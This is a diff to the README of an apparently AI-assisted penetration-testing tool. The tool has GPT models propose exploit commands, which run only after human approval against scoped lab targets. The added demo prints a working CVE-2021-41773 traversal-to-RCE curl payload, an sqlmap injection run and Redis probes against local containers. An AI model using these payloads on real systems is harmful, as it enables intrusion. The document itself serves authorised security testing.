@@ -7,7 +7,8 @@ Many models (the heads), one reasoning core (the mind).
 **Ethics:** runs ONLY against targets in `config/scope.yaml` — labs, owned systems, or in-scope bug bounty. Nothing else.
 
 ## Requirements
-- Kali Linux, Python 3.11+, nmap, gobuster, nikto, curl, sqlmap, redis-cli
+- Kali Linux, Python 3.11+, nmap, gobuster, nikto, curl, sqlmap, redis-cli,
+  hydra, wpscan, commix
 
 ## Setup
 ```bash
@@ -20,8 +21,16 @@ export OPENAI_API_KEY=sk-...   # required for the AI heads
 ```bash
 python3 main.py --target scanme.nmap.org --skip-nikto
 python3 main.py --target 127.0.0.1 --ports 1-10000 --skip-nikto
+python3 main.py --target 127.0.0.1 --skip-nikto \
+  --seed-url 'http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit' \
+  --cookie 'PHPSESSID=...; security=low'
 ```
 Out-of-scope targets are refused by the Scope Firewall before any subprocess runs.
+
+`--seed-url` injects a user-supplied endpoint as a top-priority triage finding
+(the URL must reference the scoped target). `--cookie` is a session cookie
+injected into sqlmap/curl execution only — it is never shown to the AI, never
+written to reports, and never committed.
 
 Pipeline: scope check → recon (nmap → gobuster → nikto, all saved to SQLite) →
 GPT-4o-mini triage → **per-finding GPT-4o Reasoner** → **human approval gate** →
@@ -45,8 +54,9 @@ Every allow/deny decision is logged to the `scope_events` table.
   the history of already-approved/executed actions for the target, so attack
   chains build step by step — each step human-approved.
 - The proposed command must survive `validate_action()`: tool whitelist
-  (nmap, gobuster, nikto, curl, sqlmap, redis-cli), fail-closed argument
-  validation, no file I/O args, no destructive redis commands, and it must
+  (nmap, gobuster, nikto, curl, sqlmap, redis-cli, hydra, wpscan, commix),
+  fail-closed argument validation, no file I/O args, no destructive redis
+  commands, hydra wordlists only from `/usr/share/wordlists/`, and it must
   reference the scoped target. One bad token rejects the action.
 - `passive` proposals default to **yes**; `active`/`exploit` default to **NO**
   — you must type `y` explicitly. No input / EOF = never runs.
@@ -56,8 +66,10 @@ Every allow/deny decision is logged to the `scope_events` table.
   rejection reason, execution result.
 - Approved actions execute — one human approval is the gate. Exploitation
   primitives: `curl` (fetch/traversal/RCE payloads), `sqlmap` (batch mode),
-  `redis-cli` (PING/INFO/CONFIG/KEYS...). Exploit-class tools still require
-  `environment: lab` per the scope policy.
+  `redis-cli` (PING/INFO/CONFIG/KEYS...), `hydra` (SSH/form credentials,
+  wordlists from `/usr/share/wordlists/` only), `wpscan` (WordPress
+  enumeration), `commix` (OS command injection, batch + no-shell mode).
+  Exploit-class tools still require `environment: lab` per the scope policy.
 - Model override: `HYDRAMIND_REASONER_MODEL=gpt-4o`
 
 Demo transcript: see below. First full live run: DVWA lab (Docker container on
@@ -162,6 +174,38 @@ All four actions were approved and executed. The CVE-2021-41773 RCE variant
 `echo Content-Type: text/plain; echo; id`) was also verified against the same
 lab container: `uid=1(daemon) gid=1(daemon)`.
 
+### Demo run — authenticated SQLi through the gate (real, trimmed)
+
+```text
+python3 main.py --target 127.0.0.1 --skip-nikto --ports 1-10000 \
+  --seed-url 'http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit' \
+  --cookie 'PHPSESSID=<redacted>; security=low'
+
+[seed] user endpoint queued for triage: http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit
+[HIGH] #1 — Potential SQL Injection vulnerability
+
+--- Finding #1 [HIGH] Potential SQL Injection vulnerability
+  command    : sqlmap -u 'http://127.0.0.1:8081/vulnerabilities/sqli/?id=1' --batch
+  confidence : 90%   risk: exploit
+    Approve action for finding #1? [y/N]   → running...
+  → done: rc=0, 1 finding(s)
+     + SQL injection confirmed: id (GET)
+
+--- Finding #2 [MEDIUM] Redis service exposed on port 6379
+  command    : redis-cli -h 127.0.0.1 -p 6379 CONFIG GET dir
+  → done: rc=0, 0 finding(s) — dir /data
+
+--- Finding #3 [MEDIUM] Apache httpd version 2.4.49 running on port 8080
+  command    : curl -s --path-as-is -X POST --data 'echo Content-Type: text/plain; echo; id' \
+               'http://127.0.0.1:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
+  → done: rc=0, 1 finding(s) — uid=1(daemon) gid=1(daemon) groups=1(daemon)
+     + Command execution confirmed (id output)
+```
+
+sqlmap found `id` (GET) injectable: boolean-based blind, error-based,
+time-based blind and UNION (MySQL). The session cookie was injected by the
+executor, not by the model. Full report: `data/report_6.json`.
+
 ## Lab targets (local, scope-listed, `environment: lab`)
 
 | Target | Service | Status |
@@ -170,6 +214,7 @@ lab container: `uid=1(daemon) gid=1(daemon)`.
 | `127.0.0.1:6379` | Redis 4.0.14 | unauthenticated (INFO verified) |
 | `127.0.0.1:8080` | Apache httpd 2.4.49 | CVE-2021-41773 traversal + RCE verified |
 | `127.0.0.1:8081` | DVWA v1.10 | admin/password, security low |
+| `127.0.0.1:9099` | command-injection harness (temp) | used once to verify commix live |
 
 Planned infrastructure: public-IP lab host (GitHub Student benefits) and
 Metasploit setup, so tests can run beyond localhost.
@@ -179,10 +224,13 @@ Metasploit setup, so tests can run beyond localhost.
 - Phase 1 (done): gobuster + nikto + AI triage
 - Phase 2 (done): per-finding AI reasoner + human approval gate + two-stage scope policy
 - Phase 3 (done): executable exploitation behind the single human gate —
-  curl (fetch/traversal/RCE), sqlmap (batch), redis-cli (unauth Redis);
-  CVE-2021-41773 and Redis verified live on the local lab
-- Phase 3 (remaining): hydra/wpscan/commix modules, sqlmap authenticated
-  sessions (login cookies), Juice Shop retest when the container is back
+  curl (fetch/traversal/RCE), sqlmap (batch + authenticated sessions via
+  `--cookie`), redis-cli (unauth Redis), hydra, wpscan, commix; CVE-2021-41773,
+  RCE and SQLi verified live on the local lab, commix verified live against a
+  local command-injection harness (DVWA's ping endpoint is too slow for
+  commix's time-based phase). hydra/wpscan are parser- and validation-tested,
+  awaiting SSH/WordPress lab targets for a live run.
+- Phase 3 (remaining): Juice Shop retest when the container is back
 - Phase 4: validator (second model family) + report writer + PortSwigger eval
 - Phase 5: n8n trigger/notify + dashboard
 - Phase 6: LangGraph agent + RAG (CVE/ExploitDB) + model router
